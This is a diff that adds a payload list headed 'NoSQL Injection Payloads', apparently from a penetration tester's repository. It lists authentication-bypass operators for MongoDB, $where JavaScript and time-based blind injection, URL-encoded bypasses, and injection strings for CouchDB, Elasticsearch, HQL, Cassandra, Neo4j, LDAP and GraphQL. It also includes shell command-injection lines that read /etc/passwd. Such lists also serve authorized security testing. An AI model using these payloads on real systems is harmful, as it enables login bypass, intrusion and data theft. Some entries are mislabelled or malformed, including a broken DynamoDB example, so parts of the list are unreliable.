@@ -1,0 +1,126 @@
+# ============================================
+# Author: Tamilsevan S
+# Role: Cybersecurity | Ethical Hacker | Red Hat
+# Website: https://tamilselvan-official.web.app/
+# ============================================
+# NoSQL Injection Payloads - MongoDB, CouchDB, etc.
+# ============================================
+
+## MongoDB Basic Operators
+{"username": "admin"}
+{"username": "admin", "password": "admin"}
+{"$eq": "admin"}
+{"$ne": null}
+{"$gt": ""}
+{"$gte": ""}
+{"$lt": ""}
+{"$lte": ""}
+{"$in": ["admin", "root", "user"]}
+{"$nin": [""]}
+{"$exists": true}
+{"$exists": false}
+{"$regex": ".*"}
+{"$regex": "^admin$"}
+{"$regex": "^admin", "$options": "i"}
+{"$where": "this.username == 'admin'"}
+{"$where": "this.password == this.username"}
+{"$where": "return true"}
+
+## MongoDB Authentication Bypass
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+{"username": {"$gte": ""}, "password": {"$gte": ""}}
+{"username": {"$in": ["admin", "root", "user"]}, "password": {"$gt": ""}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"username": {"$exists": true}, "password": {"$exists": true}}
+
+## MongoDB JavaScript Injection
+{"$where": "this.username == 'admin'"}
+{"$where": "this.password == 'password'"}
+{"$where": "return true"}
+{"$where": "true"}
+{"$where": "this.username.match('admin.*')"}
+{"$where": "this.password.length > 0"}
+{"$where": "this.username.length < 100"}
+{"$where": "sleep(5000)"}
+
+## MongoDB Time-Based
+{"$where": "this.password.match(/^.{1}/) && sleep(5000)"}
+{"$where": "this.password.length == 8 && sleep(5000)"}
+{"$where": "this.username.charAt(0) == 'a' && sleep(5000)"}
+
+## URL Encoded MongoDB
+%7B%22username%22%3A%7B%22%24ne%22%3Anull%7D%2C%22password%22%3A%7B%22%24ne%22%3Anull%7D%7D
+%7B%22username%22%3A%7B%22%24gt%22%3A%22%22%7D%2C%22password%22%3A%7B%22%24gt%22%3A%22%22%7D%7D
+%7B%22username%22%3A%7B%22%24exists%22%3Atrue%7D%2C%22password%22%3A%7B%22%24exists%22%3Atrue%7D%7D
+
+## CouchDB Payloads
+{"$ne": null}
+{"$gt": ""}
+{"$gte": ""}
+{"$lt": ""}
+{"$lte": ""}
+{"$exists": true}
+{"selector": {"username": {"$gt": ""}}}
+{"selector": {"password": {"$regex": ".*"}}}
+
+## Elasticsearch Injection
+{"query": {"match": {"username": "admin"}}}
+{"query": {"wildcard": {"username": "*"}}}
+{"query": {"regexp": {"username": ".*"}}}
+{"query": {"fuzzy": {"username": "admin"}}}
+{"query": {"bool": {"must": [{"match": {"username": "admin"}}]}}}
+{"query": {"script": {"script": {"inline": "doc['username'].value == 'admin'"}}}}
+{"query": {"script_score": {"script": {"source": "doc['username'].value == 'admin' ? 1 : 0"}}}}
+
+## HQL (Hibernate Query Language) Injection
+' or '1'='1
+' or 1=1 or '1'='1
+' or '1'='1' or '1'='1
+1 and 1=1
+1 and 1=2
+1 or 1=1
+1 or 1=2
+
+## Redis Injection
+"; cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+{cat /etc/passwd}
+|cat /etc/passwd
+
+## DynamoDB Injection
+{
+  "TableName": "users",
+  "KeyConditionExpression": "username = :val",
+  "ExpressionAttributeValues": {
+    ":val": {"S": "admin'}
+  }
+}
+
+## Cassandra CQL Injection
+' ALLOW FILTERING;
+' OR 1=1 ALLOW FILTERING;
+
+## Neo4j Cypher Injection
+' OR 1=1 RETURN 1
+' OR true RETURN 1
+' OR '1'='1' RETURN 1
+' AND 1=1 RETURN 1
+' AND 1=2 RETURN 1
+
+## LDAP Injection
+*)
+*)(uid=*
+*)(uid=*))((uid=*
+*)(|(uid=*))
+*)(|(uid=*))((uid=*
+)(uid=*))(|(uid=*
+
+## GraphQL Injection
+{"query": "{user(username: \"admin\") {password}}"}
+{"query": "{users(limit: 100) {username password}}"}
+{"query": "{__schema {types {name fields {name type {name}}}}}}"}
+{"query": "mutation {login(username: \"admin\", password: \"admin\") {token}}"}
